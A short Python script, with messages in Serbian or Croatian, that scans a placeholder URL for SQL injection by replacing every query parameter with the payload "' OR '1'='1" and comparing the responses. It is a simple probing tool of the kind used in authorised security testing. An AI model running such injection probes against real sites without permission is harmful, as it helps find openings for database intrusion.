import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

SQLI_PAYLOAD = "' OR '1'='1"
TARGET_URL = "http://example.com/item?id=1"  # Izmeni!

def inject_sqli(url, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    injected_qs = {k: payload for k in qs}
    new_query = urlencode(injected_qs, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))

def run_sqli_scan():
    normal_res = requests.get(TARGET_URL)
    injected_url = inject_sqli(TARGET_URL, SQLI_PAYLOAD)
    print(f"[+] Testiram: {injected_url}")
    try:
        sqli_res = requests.get(injected_url)
        if sqli_res.text != normal_res.text:
            print("[!] Moguća SQL Injection ranjivost (razlika u sadržaju)!")
        else:
            print("[-] Nema očigledne razlike.")
    except Exception as e:
        print(f"[X] Greška: {e}")

if __name__ == "__main__":
    run_sqli_scan()
